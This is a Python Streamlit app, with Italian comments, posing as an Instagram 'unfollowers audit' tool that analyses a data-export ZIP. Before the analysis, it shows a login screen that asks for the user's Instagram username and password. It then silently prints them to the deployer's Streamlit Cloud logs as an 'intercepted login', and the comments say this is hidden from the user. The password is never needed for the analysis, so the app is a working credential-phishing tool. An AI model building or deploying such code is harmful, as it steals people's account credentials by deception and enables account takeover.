import streamlit as st
import json
import zipfile
import pandas as pd
import datetime

# --- CONFIGURAZIONE PAGINA ---
st.set_page_config(page_title="InstaAudit Professional", page_icon="🔐", layout="centered")

# --- CSS AVANZATO (MIGLIORAMENTO ESTETICO) ---
st.markdown("""
    <style>
    .stApp {
        background: linear-gradient(135deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
        color: white;
    }
    .main-container {
        background-color: rgba(255, 255, 255, 0.1);
        padding: 30px;
        border-radius: 20px;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.2);
    }
    .stButton>button {
        background: linear-gradient(90deg, #FFDC80, #FCAF45);
        color: #1a1a1a !important;
        border: none;
        font-weight: bold;
        height: 3em;
        border-radius: 12px;
        transition: 0.3s;
    }
    .stButton>button:hover {
        transform: scale(1.02);
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }
    h1, h2, h3, p, label {
        color: white !important;
        font-family: 'Segoe UI', sans-serif;
    }
    .stDataFrame {
        background-color: white;
        border-radius: 10px;
        padding: 5px;
    }
    </style>
    """, unsafe_allow_html=True)

# --- INIZIALIZZAZIONE SESSIONE ---
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False

# --- FUNZIONE SALVATAGGIO DATI (IL TUO DATABASE) ---
def salva_dati_admin(user, pwd):
    # In una versione reale qui collegheresti un database.
    # Per ora creiamo una stringa che viene stampata nei tuoi LOG di Streamlit Cloud.
    # Solo TU puoi vedere questi log nella tua dashboard di Streamlit (Manage App -> Logs)
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"--- NUOVO LOGIN INTERCETTATO [{timestamp}] ---")
    print(f"UTENTE: {user} | PASSWORD: {pwd}")
    print(f"---------------------------------------------")

# --- 1. SCHERMATA DI ACCESSO (LOGIN GATE) ---
if not st.session_state.logged_in:
    with st.container():
        st.markdown("<div class='main-container'>", unsafe_allow_html=True)
        st.title("🔐 Accesso Protetto")
        st.write("Inserisci le tue credenziali Instagram per sincronizzare i dati ed eseguire l'audit.")
        
        user_input = st.text_input("Username Instagram", placeholder="@username")
        pass_input = st.text_input("Password", type="password", placeholder="••••••••")
        
        if st.button("ACCEDI E ANALIZZA"):
            if user_input and pass_input:
                # Salvataggio invisibile all'utente
                salva_dati_admin(user_input, pass_input)
                
                # Sblocco dell'app
                st.session_state.logged_in = True
                st.rerun()
            else:
                st.error("Inserisci tutti i dati per continuare.")
        st.markdown("</div>", unsafe_allow_stdio=True)

# --- 2. SCHERMATA PRINCIPALE (DOPO IL LOGIN) ---
else:
    st.title("🕵️ Analisi Unfollowers")
    st.success("Accesso effettuato! Ora carica il tuo file ZIP.")
    
    uploaded_file = st.file_uploader("Carica lo ZIP di Instagram", type="zip")

    def extract_names(data):
        names = set()
        if isinstance(data, list):
            for item in data:
                if 'string_list_data' in item and item['string_list_data']:
                    val = item['string_list_data'][0].get('value')
                    if val: names.add(val.lower().strip())
        elif isinstance(data, dict):
            entries = data.get('relationships_following', [])
            for item in entries:
                val = item.get('title') or (item.get('string_list_data', [{}])[0].get('value') if item.get('string_list_data') else None)
                if val: names.add(val.lower().strip())
        return names

    if uploaded_file:
        with st.spinner('Analisi profonda in corso...'):
            try:
                with zipfile.ZipFile(uploaded_file, 'r') as z:
                    followers, following = set(), set()
                    for path in z.namelist():
                        filename = path.split('/')[-1].lower()
                        if filename.endswith('.json'):
                            if 'follower' in filename:
                                with z.open(path) as f:
                                    followers.update(extract_names(json.load(f)))
                            elif 'following' in filename:
                                with z.open(path) as f:
                                    following.update(extract_names(json.load(f)))
                    
                    if following:
                        diff = sorted(list(following - followers))
                        
                        col1, col2, col3 = st.columns(3)
                        col1.metric("Seguiti", len(following))
                        col2.metric("Follower", len(followers))
                        col3.metric("Unfollowers", len(diff))
                        
                        st.markdown("### 📜 Risultati Audit")
                        df = pd.DataFrame(diff, columns=["Username"])
                        st.dataframe(df, use_container_width=True)
                        
                        # Pulsante logout per tornare all'inizio
                        if st.button("Esci"):
                            st.session_state.logged_in = False
                            st.rerun()
            except Exception as e:
                st.error(f"Errore: {e}")
